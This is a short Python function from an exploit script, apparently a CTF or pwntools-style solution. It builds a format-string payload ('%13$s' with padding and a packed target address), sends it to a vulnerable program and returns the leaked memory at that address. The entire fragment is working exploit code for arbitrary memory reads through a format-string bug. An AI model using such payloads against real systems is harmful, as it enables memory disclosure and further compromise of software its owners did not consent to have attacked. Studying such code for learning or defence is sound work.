	def leak_addr(addr):
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
	    data = send_payload(payload)
	    if data == b'(null)':
	        return b'\x00'
	    return data + b'\x00'
